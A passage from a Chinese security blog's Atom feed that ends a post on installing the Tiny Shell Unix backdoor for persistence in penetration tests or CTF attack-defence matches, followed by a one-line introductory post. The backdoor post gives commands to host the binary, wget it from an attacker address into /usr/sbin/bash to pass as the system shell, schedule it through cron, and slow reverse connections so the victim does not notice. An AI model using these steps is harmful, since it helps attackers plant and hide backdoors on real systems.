class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>很多时候需要用<code>wget</code>​命令下载tshd到受害者机器上，现在给出一个简单的python脚本提供web下载服务，将需要下载的文件放在同一目录即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup python3 app.py &gt; output.log <span class="number">2</span>&gt;&amp;<span class="number">1</span> &amp;</span><br></pre></td></tr></table></figure><p>然后wget下载文件到<code>/usr/sbin</code>​目录下即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O /usr/sbin/bash http://<span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span>:<span class="number">5000</span>/download/bash</span><br></pre></td></tr></table></figure><h3 id="添加计划任务"><a href="#添加计划任务" class="headerlink" title="添加计划任务"></a>添加计划任务</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>打开编辑器，添加一条每天凌晨4点运行<code>/usr/sbin/bash</code>​，保存即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="number">4</span> * * * /usr/sbin/bash</span><br></pre></td></tr></table></figure><h3 id="反向连接的延迟时间"><a href="#反向连接的延迟时间" class="headerlink" title="反向连接的延迟时间"></a>反向连接的延迟时间</h3><p><code>CONNECT_BACK_DELAY</code>​的单位是秒，如果延迟时间过短，频率过高的反弹流量，可能会被受害者发现，建议降低频率</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://cloud.tencent.com/developer/article/1047029">短小精干的Unix类后门Tiny shell的使用与分析</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在我们进行渗透测试或者是CTF的AWD模式时，都需要做权限驻留，这里介绍一款开源的UNIX后门&lt;/p&gt;</summary>
    
    
    
    
    <category term="渗透测试" scheme="https://qwegz.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="权限维持" scheme="https://qwegz.github.io/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>我的第一篇文章</title>
    <link href="https://qwegz.github.io/2025/02/07/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
    <id>https://qwegz.github.io/2025/02/07/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</id>
    <published>2025-02-07T11:04:21.000Z</published>
    <updated>2025-02-07T11:18:45.624Z</updated>
    
    <content type="html"><![CDATA[<p>后续我会在这个博客里更新我的CTF比赛题解和攻防积累所得</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;后续我会在这个博客里更新我的CTF比赛题解和攻防积累所得&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
</feed>
